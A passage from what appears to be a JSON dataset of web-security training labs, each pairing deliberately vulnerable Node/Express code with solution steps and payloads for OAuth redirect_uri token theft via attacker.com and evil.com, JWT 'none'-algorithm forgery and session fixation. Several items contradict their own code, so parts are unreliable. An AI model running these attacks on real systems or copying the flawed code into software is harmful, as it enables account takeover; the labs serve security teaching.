      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to analyze the OAuth flow and capture the authorization URL including the state parameter.",
        "Replace the 'state' parameter value with an attacker-controlled redirect URI that points to your malicious server.",
        "Send this manipulated link to the victim and wait for them to authorize the request.",
        "Monitor your server to capture the victim’s access token in the redirected request.",
        "Use Postman to set the Authorization header to 'Bearer {captured-token}' and access /my-account as carlos."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.use(require('body-parser').urlencoded({ extended: true })); app.get('/auth', (req, res) => { const { response_type, client_id, redirect_uri, state } = req.query; const token = 'token-carlos-xyz'; const redirect = `${redirect_uri}#access_token=${token}&state=${state}`; res.redirect(redirect); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-carlos-xyz') res.send('Account details for carlos'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Implicit Flow Lab running on http://localhost:4000'));",
      "payloads": [
        "Authorization URL: /auth?response_type=token&client_id=app123&redirect_uri=http://attacker.com/catch&state=abc123",
        "Authorization: Bearer token-carlos-xyz"
      ]
    },
    {
      "Lab scenario": "JWT Signature Verification Bypass in Token Validation Middleware",
      "Lab Description": "The application uses JSON Web Tokens (JWT) for session management but improperly trusts the 'alg' field from the token header. When this is set to 'none', the application skips signature verification. The application issues JWTs signed with a secret and expects a valid signature. To solve: Forge a valid token for 'carlos' by exploiting the 'none' algorithm bypass and access his account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept a login request using Burp Suite and capture a valid JWT from the Authorization header.",
        "Validate the token structure and identify the 'alg' value in the decoded JWT header using jwt.io.",
        "Craft a new JWT with the 'alg' set to 'none' and the payload containing 'username':'carlos'.",
        "Replace the original token with the crafted unsigned JWT in Burp Repeater and forward the request.",
        "If successful, observe that the account page for 'carlos' loads, confirming the signature bypass."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET_KEY = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, SECRET_KEY, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; if (!token) return res.status(401).send('Token missing'); const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { res.send(`Account details for ${decoded.payload.username}`); } else { try { jwt.verify(token, SECRET_KEY); res.send(`Account details for ${decoded.payload.username}`); } catch { res.status(403).send('Invalid token'); } } }); app.listen(4000, () => console.log('JWT Signature Bypass Lab running on http://localhost:4000'));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9"
      ]
    },
    {
      "Lab scenario": "OAuth Authorization Code Interception in Redirect Handler",
      "Lab Description": "The application implements OAuth 2.0 for third-party login using a redirect_uri parameter vulnerable to open redirection. An attacker can intercept the authorization code before token exchange. The application trusts user-controlled redirect URLs without validation. To solve: Steal Carlos's authorization code via a manipulated redirect_uri and log into his account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to intercept the OAuth flow and modify the redirect_uri to a malicious domain you control.",
        "Use a local listener (like Postman Interceptor or Burp Collaborator) to capture the authorization code when the victim authenticates.",
        "Manually exchange the intercepted authorization code for an access token using Postman or curl.",
        "Use the obtained token to make an authenticated request to /my-account as Carlos.",
        "Verify the successful compromise by accessing Carlos's profile data."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); app.get('/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = 'authcode123'; res.redirect(`${redirect_uri}?code=${code}&state=${state}`); }); app.post('/token', (req, res) => { const { code } = req.body; if (code === 'authcode123') res.json({ access_token: 'supersecrettoken' }); else res.status(400).send('Invalid code'); }); app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; if (auth === 'Bearer supersecrettoken') res.send('Account details for carlos'); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('OAuth Code Interception Lab running on http://localhost:4000'));",
      "payloads": [
        "https://attacker.com/callback?code=authcode123",
        "https://malicious-site.io/callback?code=authcode123"
      ]
    },
    {
      "Lab scenario": "Session Fixation via Insecure Cookie Assignment in Login Flow",
      "Lab Description": "The application improperly assigns the session identifier before user authentication, allowing attackers to fixate a known session ID. The server does not regenerate the session token post-login. To solve: Fixate a session ID before login and trick Carlos into logging in, then reuse the same session to access his account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to intercept the initial GET /login request and observe the Set-Cookie response with session ID.",
        "Send the fixed session ID to the victim via social engineering and wait for them to log in.",
        "Once the victim logs in, reuse the same fixed session cookie in Burp Repeater.",
        "Access the /my-account endpoint while sending the fixed session cookie to hijack the authenticated session.",
        "Confirm access to Carlos's account, demonstrating successful session fixation exploitation."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/login', (req, res) => { if (!req.cookies.session) { const sid = Math.random().toString(36).substring(2); res.cookie('session', sid); res.send('Session initialized'); } else { res.send('Session exists'); } }); const users = { 'carlos': { password: 'qwerty', session: null } }; app.post('/authenticate', (req, res) => { const { username, password } = req.body; if (users[username] && users[username].password === password) { users[username].session = req.cookies.session; res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const user = Object.keys(users).find(u => users[u].session === req.cookies.session); if (user) res.send(`Account details for ${user}`); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
      "payloads": [
        "session=attackerfixedsession",
        "session=knownsessionvalue"
      ]
    },
    {
      "Lab scenario": "JWT signature verification bypass in REST API login",
      "Lab Description": "This lab's RESTful authentication mechanism uses JWTs but fails to verify the token signature correctly when the 'alg' field is manipulated. The application accepts JWTs from clients to grant access to protected resources. However, the backend incorrectly trusts unsigned tokens when the 'alg' is set to 'none'. To solve: craft and submit a forged token to access Carlos's protected account endpoint.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Capture a valid JWT token using Burp Suite by logging into your own account and intercepting the Authorization header.",
        "Inspect the JWT token in jwt.io and observe the 'alg' header, which is likely set to HS256.",
        "Modify the JWT header to set 'alg' to 'none' and remove the signature part of the token.",
        "Modify the payload section to change the username to 'carlos' and re-encode the JWT.",
        "Resend the forged token using Burp Repeater in the Authorization header and confirm the server grants access to Carlos's /my-account endpoint."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { carlos: 'password123' }; const secret = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ user: username }, secret, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).json({ error: 'Invalid credentials' }); } }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; const token = authHeader && authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, secret); res.send(`Welcome ${decoded.user}`); } catch { res.status(403).send('Access Denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Auth Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "{\"alg\":\"none\"}",
        "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0.",
        "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0."
      ]
    },
    {
      "Lab scenario": "Session fixation via predictable session tokens in login flow",
      "Lab Description": "This web application's login process is vulnerable to session fixation. The server fails to regenerate session tokens upon successful login, allowing an attacker to set a valid session ID in advance and hijack a victim's authenticated session. To solve: pre-set a session ID before login, then log in as Carlos using that fixed session.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Using Burp Suite, intercept the GET /login page request and note the Set-Cookie response containing the session ID.",
        "Modify the session cookie to a chosen predictable value, such as 'fixed-session-id', using Burp Repeater or browser dev tools.",
        "Send the fixed session ID to Carlos via social engineering or session injection (simulated for the lab).",
        "Log in as Carlos using his known credentials while maintaining the fixed session ID.",
        "After login, navigate to /my-account to confirm access using the pre-set session token."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = { carlos: 'letmein' }; app.get('/login', (req, res) => { const sessionId = req.cookies.sessionid || Math.random().toString(36).substring(2); res.cookie('sessionid', sessionId); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { res.send(`Logged in as ${username}`); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { if (req.cookies.sessionid === 'fixed-session-id') { res.send('Welcome carlos'); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "Cookie: sessionid=fixed-session-id",
        "POST /login with pre-set Cookie: sessionid=fixed-session-id",
        "Use same sessionid to access /my-account"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration leaking authorization code via redirect URI manipulation",
      "Lab Description": "This lab's OAuth 2.0 implementation misconfigures the allowed redirect URIs, failing to validate the domain properly. Attackers can manipulate the redirect URI to capture the authorization code for any user. To solve: hijack Carlos's authorization code and use it to obtain an access token and access his account page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Using OWASP ZAP or Burp Suite, initiate an OAuth login flow and observe the redirect_uri parameter in the authorization URL.",
        "Modify the redirect_uri to an attacker-controlled domain using an open redirect service like https://evil.com/path.",
        "Send the modified URL to Carlos (simulated) and wait for him to authenticate and be redirected to your server capturing the authorization code.",
        "Exchange the captured authorization code for an access token via POST /oauth/token using Postman.",
        "Use the obtained access token in the Authorization header to access /my-account as Carlos."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const authCodes = {}; const tokens = {}; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = Math.random().toString(36).substring(2); authCodes[code] = 'carlos'; res.redirect(`${redirect_uri}?code=${code}&state=${state}`); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (authCodes[code]) { const token = `token-${authCodes[code]}`; tokens[token] = authCodes[code]; res.json({ access_token: token }); } else { res.status(400).json({ error: 'Invalid code' }); } }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; const token = authHeader && authHeader.split(' ')[1]; if (tokens[token]) { res.send(`Account details for ${tokens[token]}`); } else { res.status(403).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Misconfig Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "https://vulnerable.com/authorize?client_id=xyz&redirect_uri=https://evil.com/path&state=abc",
        "POST /oauth/token with code=<captured_code>",
        "Authorization: Bearer token-carlos"
      ]
    },
    {
      "Lab scenario": "JWT token signature vulnerability in session management",
      "Lab Description": "This lab's session management mechanism uses JSON Web Tokens (JWT) for authentication but fails to securely verify the token's signature. The application uses a hardcoded secret and doesn't validate the algorithm properly. To solve: forge a valid admin token using the known public key and access the admin control panel.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to intercept and decode the JWT token after authenticating with a user account.",
        "Validate if the token's 'alg' header can be modified by setting it to 'none' or 'HS256' without verification failures.",
        "Craft a custom JWT token with 'alg' set to 'HS256' and use 'admin' as the username, signing it using the discovered or null secret.",
        "Resend the forged token as a cookie using Burp Repeater to access the /admin page.",
        "Verify successful exploitation by observing the 'Admin Control Panel' interface."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET_KEY = 'insecuresecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username, role: 'user' }, SECRET_KEY, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, SECRET_KEY); if (decoded.role === 'admin') { res.send('Welcome Admin!'); } else { res.status(403).send('Forbidden'); } } catch (err) { res.status(401).send('Invalid Token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Lab running at http://localhost:${PORT}`));",
      "payloads": [
        "Header: { \"alg\": \"HS256\", \"typ\": \"JWT\" }, Payload: { \"user\": \"admin\", \"role\": \"admin\" }, Signature: HMAC(HS256, 'insecuresecret')",
        "Header: { \"alg\": \"none\" }, Payload: { \"user\": \"admin\", \"role\": \"admin\" }, Signature: ''"
      ]
    },
    {
      "Lab scenario": "OAuth implicit grant misconfiguration in login flow",
      "Lab Description": "This lab simulates an OAuth-based login mechanism that incorrectly trusts user-supplied redirect URIs and fails to validate tokens properly. The application exposes the access token directly in the URL hash, allowing attackers to manipulate it. To solve: hijack an OAuth token using a crafted redirect URI and access the victim's protected resources.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use OWASP ZAP to passively scan the OAuth flow during login and extract the authorization URL.",
        "Modify the redirect_uri parameter to an attacker-controlled domain and observe token leakage via URL fragments.",
        "Construct a malicious OAuth authorization request that uses the manipulated redirect_uri.",
        "Capture the leaked token using a listener on the attacker's server (e.g., with netcat or Burp Collaborator).",
        "Replay the stolen token to the /account endpoint and confirm ownership of the victim's session."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); const users = { 'carlos': { accessToken: 'abc123token' } }; app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const token = users['carlos'].accessToken; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/account', (req, res) => { const { token } = req.query; if (token === users['carlos'].accessToken) { res.send('Welcome, carlos!'); } else { res.status(403).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Lab running at http://localhost:${PORT}`));",
      "payloads": [
        "https://victim-site.com/auth?redirect_uri=https://attacker.com/capture",
        "https://attacker.com/#access_token=abc123token"
      ]
    },
    {
      "Lab scenario": "Session fixation attack via URL parameter in login endpoint",
      "Lab Description": "This lab's login endpoint fails to regenerate session tokens after successful authentication, allowing attackers to set their own session ID via a URL parameter. If the session ID remains unchanged after login, attackers can predetermine the victim's session. To solve: fixate your session ID and access Carlos's account after forcing him to log in.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Postman to send a GET request to /login?session=attackersessionid and note the session cookie assigned.",
        "Craft a phishing link containing the same session ID and send it to the victim.",
        "Upon victim login, the session remains fixed to 'attackersessionid', allowing hijacking.",
        "Use the same session cookie in your browser or Postman to access the /my-account endpoint.",
        "Verify that the server returns the victim's personalized account page."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/login', (req, res) => { const sessionID = req.query.session || Math.random().toString(36).substr(2); res.cookie('session', sessionID); res.send('Session initialized'); }); app.get('/my-account', (req, res) => { const session = req.cookies.session; if (session === 'attackersessionid') { res.send('Welcome carlos!'); } else { res.send('Welcome guest'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running at http://localhost:${PORT}`));",
      "payloads": [
        "GET /login?session=attackersessionid",
        "Set-Cookie: session=attackersessionid",
        "GET /my-account with Cookie: session=attackersessionid"
      ]
    },
    {
      "Lab scenario": "JWT Signature None Algorithm Bypass in Authorization Header",
      "Lab Description": "This lab's authentication system uses JSON Web Tokens (JWT) for session management. The server-side JWT verification improperly trusts tokens with the `alg` field set to 'none'. The application signs user sessions, but fails to enforce algorithm validation during token parsing, allowing attackers to forge tokens without knowing the secret key. To solve: Log in as the 'carlos' user by crafting a valid JWT without the signing key.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept the JWT token after logging into your own account using Burp Suite.",
        "Validate that the token uses HS256 or RS256 by decoding the header and checking the `alg` field.",
        "Modify the JWT header: set `alg` to `none` and remove the signature part of the token.",
        "Set the `sub` claim in the payload to `carlos` and replace your session cookie in the browser with the forged token.",
        "Visit the /my-account endpoint to confirm successful login as Carlos."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecretkey'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'password123') { const token = jwt.sign({ sub: username }, secret, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'RS256', 'none'] }); res.send('Account details for ' + decoded.sub); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Algorithm Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
        "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ",
        "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ."
      ]
    },
    {
      "Lab scenario": "Session Fixation via URL Parameter in Login Flow",
      "Lab Description": "This lab's session handling mechanism is vulnerable to fixation attacks. The session ID is accepted from a user-supplied URL parameter (`sessionId`) and assigned without regeneration upon login, enabling attackers to predetermine session IDs for victims. To solve: Log in as Carlos by fixing a session ID before authentication and reuse it post-login to hijack his session.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use OWASP ZAP or Burp Suite to intercept the initial GET /login request and observe the URL sessionId parameter.",
        "Confirm that the server allows setting the session ID via the URL and does not regenerate it after successful login.",
        "Craft a phishing link embedding a predictable `sessionId` value like `/login?sessionId=attackersession123`.",
        "Wait until the victim uses this link and logs in. Then reuse the same `sessionId` in your own browser to access /my-account.",
        "Verify that you now have access to the victim's session as Carlos."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/login', (req, res) => { const sid = req.query.sessionId || Math.random().toString(36).substring(2); res.cookie('sessionId', sid); res.send(`<form method='POST' action='/login'>Username: <input name='username'/><br>Password: <input name='password'/><br><button>Login</button></form>`); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'supersecret') res.redirect('/my-account'); else res.status(401).send('Invalid credentials'); }); app.get('/my-account', (req, res) => { const sessionId = req.cookies['sessionId']; if (sessionId === 'attackersession123') res.send('Account details for carlos'); else res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "http://victim-app/login?sessionId=attackersession123",
        "sessionId=attackersession123",
        "Cookie: sessionId=attackersession123"
      ]
    },
    {
      "Lab scenario": "OAuth Misconfiguration Token Leakage in Redirect URI",
      "Lab Description": "This lab's OAuth implementation is vulnerable due to overly permissive redirect URI validation. An attacker can manipulate the redirect URI parameter to leak authorization codes to a malicious domain. The OAuth server accepts partial matching on registered redirect URIs, making it possible to inject crafted URLs. To solve: Extract the OAuth token for Carlos and access his account page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to intercept the OAuth login flow and inspect the `redirect_uri` parameter.",
        "Modify `redirect_uri` to embed a malicious endpoint using an open redirect or subdomain like `https://attacker.com?code=`.",
        "Login as Carlos and complete the OAuth flow to capture the leaked authorization code in your listener.",
        "Exchange the stolen code for an access token via Postman or curl.",
        "Use the access token to call the /my-account API as Carlos."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); app.get('/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = 'authcode1234'; if (redirect_uri.startsWith('https://trusted.com')) { const redirect = `${redirect_uri}?code=${code}&state=${state}`; res.redirect(redirect); } else { res.status(400).send('Invalid redirect URI'); } }); app.get('/token', (req, res) => { const { code } = req.query; if (code === 'authcode1234') res.json({ access_token: 'valid_token_for_carlos' }); else res.status(400).send('Invalid code'); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer valid_token_for_carlos') res.send('Account details for carlos'); else res.status(401).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Misconfig Token Leak Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "https://attacker.com?code=",
        "https://trusted.com.attacker.com",
        "https://trusted.com%00.attacker.com"
      ]
    },
    {
      "Lab scenario": "Session Fixation via predictable session tokens in login flow",
      "Lab Description": "This lab demonstrates a session fixation vulnerability within the login mechanism. The application assigns session IDs prior to authentication but fails to regenerate them post-login, allowing an attacker to fixate a session. The application uses insecure random generation for the session token which is passed as a cookie. To solve: fixate Carlos's session and access his account by predefining the session ID before he logs in.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite's Proxy and Intercept to inspect the login request and response to identify the session cookie assigned pre-authentication.",
        "Confirm that the same session cookie persists after a successful login, indicating the vulnerability.",
        "Craft a malicious link embedding the session ID in the cookie and deliver it to the victim (Carlos) via social engineering.",
        "Once Carlos logs in using the fixated session, reuse the same session ID in your browser to gain access to his authenticated session.",
        "Verify access by navigating to /my-account and confirming Carlos's account data."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const crypto = require('crypto'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const users = { carlos: 'hunter2' }; app.use((req, res, next) => { if (!req.cookies.session) { const sessionId = crypto.randomBytes(4).toString('hex'); res.cookie('session', sessionId); } next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { res.send('Login successful. Welcome ' + username); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { res.send('Account page for logged in user.'); }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
      "payloads": [
        "Set-Cookie: session=deadbeef;",
        "Inject fixated session ID via intercepted HTTP request before victim login.",
        "Share crafted malicious URL with embedded session parameter.",
        "Replay the fixed session post-victim login."
      ]
    },
    {
      "Lab scenario": "JWT token signature spoofing via 'none' algorithm",
      "Lab Description": "This lab uses JWT tokens for authentication but fails to properly enforce signature verification, accepting tokens with the algorithm field set to 'none'. The application trusts the header-supplied algorithm, allowing attackers to bypass authentication by supplying an unsigned token. To solve: forge a token for Carlos without needing the secret and log into his account.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to capture a valid JWT token from your own account during login.",
        "Decode the JWT token using jwt.io or Burp Decoder to inspect its structure.",
        "Modify the 'alg' field in the header to 'none' and change the payload's username to 'carlos'.",
        "Remove the signature part entirely and re-encode the JWT token.",
        "Replay the modified token in the Authorization header and access /my-account to confirm successful login as Carlos."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET = 'supersecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Unauthorized'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none' || jwt.verify(token, SECRET)) { res.send('Welcome ' + decoded.payload.username); } else { res.status(401).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT None Algorithm Lab running on http://localhost:4000'));",
      "payloads": [
        "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
        "Payload: { \"username\": \"carlos\" }",
        "JWT token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
        "Authorization: Bearer [forged_token]"
      ]
    },
    {
      "Lab scenario": "OAuth2 token leakage via referrer header in third-party redirect",
      "Lab Description": "This lab demonstrates insecure OAuth2 token handling. After successful authorization, the application redirects users to a third-party site, leaking the token in the Referer header. Attackers can capture the token from this third-party service and reuse it. To solve: capture Carlos's leaked OAuth token and use it to access his account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite's Proxy to capture the OAuth2 authorization flow and observe the 'Location' header on redirect.",
        "Identify the OAuth2 access token being appended as a query parameter during redirection to a third-party domain.",
        "Set up your own HTTP server to mimic the third-party service and intercept incoming requests with tokens.",
        "Send Carlos a crafted phishing link that triggers OAuth flow; once he logs in, the token will be sent to your server via the Referer header.",
        "Replay the intercepted token using Postman to authenticate as Carlos and access /my-account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); const tokens = { carlos: 'abc123token' }; app.get('/auth', (req, res) => { const { user } = req.query; const token = tokens[user]; res.redirect('http://third-party.com/welcome?access_token=' + token); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer abc123token') { res.send('Carlos Account Details'); } else { res.status(401).send('Unauthorized'); } }); app.listen(4000, () => console.log('OAuth Token Leak Lab running on http://localhost:4000'));",
      "payloads": [
        "Intercept Referer header during third-party redirect: access_token=abc123token",
        "Crafted phishing OAuth consent link: http://victim-app.com/auth?user=carlos",
        "Authorization: Bearer abc123token",
        "Replay token in Postman or Burp to access /my-account"
      ]
    },
    {
      "Lab scenario": "JWT signature spoof via algorithm confusion",
      "Lab Description": "This lab demonstrates an insecure JSON Web Token (JWT) validation implementation that incorrectly trusts the 'alg' header of incoming tokens. The application uses symmetric HMAC verification but allows switching the algorithm to 'none'. To solve: Craft a forged token to escalate to the 'admin' user and access the admin panel.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to intercept the JWT from a logged-in user request and decode it using jwt.io or Burp Decoder.",
        "Confirm the JWT structure and spot the 'alg' value set to 'HS256'. Change it to 'none' and remove the signature part.",
        "Manually edit the payload to replace your username with 'admin'.",
        "Send the modified token using Burp Repeater to authenticate as 'admin'.",
        "Visit the /admin route to verify successful privilege escalation."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.verify(token, secret); if (payload.username === 'admin') { res.send('Welcome, admin!'); } else { res.status(403).send('Access Denied'); } } catch (e) { res.status(401).send('Invalid Token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Spoof Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0",
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
      ]
    },
    {
      "Lab scenario": "OAuth authorization code reuse",
      "Lab Description": "This lab's OAuth 2.0 flow is improperly designed, allowing an attacker to reuse a captured authorization code to hijack a user session. The application does not properly invalidate codes after first use. To solve: Steal and reuse a victim's authorization code to log in as that user.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use OWASP ZAP to proxy your login and capture the OAuth redirection flow.",
        "Analyze the authorization code grant flow, note the 'code' parameter in the URL.",
        "Intercept the victim's OAuth callback request and capture their 'code' value.",
        "Manually replay the callback request using the victim's code via Burp Repeater.",
        "Access the victim's account dashboard to confirm successful session hijack."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.use(express.urlencoded({ extended: true })); let sessions = {}; app.get('/oauth/callback', async (req, res) => { const code = req.query.code; if (!code) return res.status(400).send('No code provided'); try { const tokenResponse = await axios.post('https://auth-server/token', { code }); sessions[req.ip] = tokenResponse.data.user; res.redirect('/my-account'); } catch (err) { res.status(500).send('OAuth exchange failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.ip]; if (!user) return res.status(401).send('Not logged in'); res.send(`Welcome ${user}`); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Code Reuse Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "/oauth/callback?code=stolen_code_value",
        "/oauth/callback?code=previously_valid_code",
        "/oauth/callback?code=reused_auth_code"
      ]
    },
    {
      "Lab scenario": "Session fixation via predictable session IDs",
      "Lab Description": "This lab simulates a session fixation vulnerability where the session identifier is predictable and not regenerated after login. The application uses user-controlled session IDs from URL parameters, allowing attackers to set a session ID before authentication. To solve: Fixate a session ID before login and hijack the authenticated session.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Postman to send a GET request to /login?sessionId=attacker123 before authentication.",
        "Send the same sessionId parameter to the victim in a phishing link and wait for them to log in.",
        "Once the victim logs in using the fixed session ID, send a GET /my-account request using the same sessionId cookie.",
        "Observe the response to confirm account takeover.",
        "Access /my-account to solve the lab and complete the session hijack."
      ],
      "Vulnerability name": "Authentication",
